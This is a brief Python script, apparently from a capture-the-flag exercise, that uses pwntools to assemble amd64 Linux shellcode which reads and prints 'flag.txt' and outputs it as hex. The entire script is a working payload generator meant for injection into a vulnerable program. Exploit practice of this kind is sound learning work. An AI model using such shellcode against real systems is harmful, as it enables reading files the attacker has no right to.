#!/bin/python3

from pwn import *

context(os="linux", arch="amd64", log_level="error")

# syscall and args
syscall = pwnlib.shellcraft.amd64.linux.cat('flag.txt')

# Generate shellcode
print(asm(syscall).hex())
